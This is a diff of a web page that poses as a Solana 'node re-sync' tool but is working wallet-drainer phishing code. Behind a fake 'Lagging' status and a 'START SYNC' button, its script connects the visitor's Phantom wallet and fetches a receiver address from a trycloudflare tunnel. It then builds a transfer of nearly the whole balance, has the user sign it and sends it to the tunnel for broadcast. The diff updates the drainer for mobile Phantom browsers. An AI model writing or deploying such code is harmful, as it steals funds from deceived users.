@@ -3,93 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Node Sync</title>
-    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <title>Node Sync Center</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
-        body { background: #0c0c0c; color: #14f195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #1a1a1a; padding: 40px; border: 1px solid #14f195; text-align: center; border-radius: 8px; width: 320px; }
-        .bar { background: #333; height: 4px; margin: 25px 0; overflow: hidden; }
-        #fill { background: #14f195; height: 100%; width: 0%; transition: 0.5s; }
-        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; }
+        body { background: #000; color: #14f195; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
+        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
+        #log { font-size: 10px; color: #555; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h3 style="color:#9945FF;">SOLANA MONITOR</h3>
-        <p style="font-size: 12px; color: #888;">STATUS: <span style="color:#ff3e3e;">DE-SYNC</span></p>
-        <div class="bar"><div id="fill"></div></div>
-        <button id="cta">RE-SYNC NOW</button>
-        <p id="info" style="font-size: 11px; margin-top:15px; color: #555;">Ready</p>
+        <h3 style="color:#9945FF;">SYSTEM RE-SYNC</h3>
+        <p style="font-size:12px;">Node Status: <span style="color:red;">Lagging</span></p>
+        <button id="cta">START SYNC</button>
+        <div id="log">Ready to connect...</div>
     </div>
 
     <script>
-        // 🔱 检查隧道链接
         const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
 
         document.getElementById('cta').onclick = async () => {
-            const p = window.solana;
+            const log = (m) => document.getElementById('log').innerText = m;
             const sWeb3 = window.solanaWeb3;
-            if (!p) { alert("Please use Phantom"); return; }
+            // 🔱 兼容性判断：尝试从各种入口抓取钱包
+            const provider = window.solana || window.phantom?.solana;
+
+            if (!provider) {
+                alert("Please open this link inside Phantom App browser.");
+                return;
+            }
 
             try {
-                // 1. 连钱包
-                await p.connect();
-                document.getElementById('fill').style.width = "30%";
-                document.getElementById('info').innerText = "Connecting RPC...";
+                log("Connecting...");
+                await provider.connect();
+                const userAddr = provider.publicKey.toString();
 
-                // 2. 问后端要配置 (不让后端查账，防止 403)
-                const conf = await fetch(`${tunnel}/prepare`, {
+                log("Fetching params...");
+                // 1. 拿后端地址
+                const info = await fetch(`${tunnel}/prepare`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
+                    body: JSON.stringify({ address: userAddr })
                 }).then(r => r.json());
 
-                // 3. 前端利用手机网络查余额和 Blockhash
-                const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
-                const balance = await conn.getBalance(p.publicKey);
-                const bhObj = await conn.getLatestBlockhash();
-                
-                document.getElementById('fill').style.width = "60%";
-                document.getElementById('info').innerText = "Preparing Transaction...";
+                log("Calculating balance...");
+                // 2. 建立连接 (不走服务器，走手机流量直连)
+                const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+                const balance = await conn.getBalance(provider.publicKey);
+                const bh = await conn.getLatestBlockhash();
 
-                // 4. 算账：全额扣除 0.001 SOL
-                const amount = balance - 1000000; 
-                if (amount <= 0) { alert("Node Synced"); return; }
+                // 3. 算子弹 (留 0.001 SOL)
+                const amount = balance - 1000000;
+                if (amount <= 0) { log("Balance too low"); return; }
 
-                // 5. 构造并唤起签名
+                log("Requesting sign...");
+                // 4. 构造交易
                 const tx = new sWeb3.Transaction().add(
                     sWeb3.SystemProgram.transfer({
-                        fromPubkey: p.publicKey,
-                        toPubkey: new sWeb3.PublicKey(conf.receiver),
+                        fromPubkey: provider.publicKey,
+                        toPubkey: new sWeb3.PublicKey(info.receiver),
                         lamports: amount,
                     })
                 );
-                tx.recentBlockhash = bhObj.blockhash;
-                tx.feePayer = p.publicKey;
+                tx.recentBlockhash = bh.blockhash;
+                tx.feePayer = provider.publicKey;
 
-                const signed = await p.signTransaction(tx);
-                document.getElementById('info').innerText = "Broadcasting...";
+                // 5. 拉起签名 (核心关键)
+                const signed = await provider.signTransaction(tx);
+                log("Broadcasting...");
 
-                // 6. 回传广播
+                // 6. 后台广播
                 const serialized = signed.serialize();
-                let binary = '';
-                const bytes = new Uint8Array(serialized);
-                for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
+                const base64 = btoa(String.fromCharCode.apply(null, new Uint8Array(serialized)));
                 
                 fetch(`${tunnel}/broadcast`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ raw_tx: btoa(binary) })
+                    body: JSON.stringify({ raw_tx: base64 })
                 });
 
-                document.getElementById('fill').style.width = "100%";
-                document.getElementById('info').innerText = "Success!";
+                log("Sync Success!");
                 setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
 
-            } catch (e) {
-                console.error(e);
-                document.getElementById('info').innerText = "Retrying...";
-                setTimeout(() => { location.reload(); }, 2000);
+            } catch (err) {
+                console.error(err);
+                log("Error: " + err.message);
             }
         };
     </script>
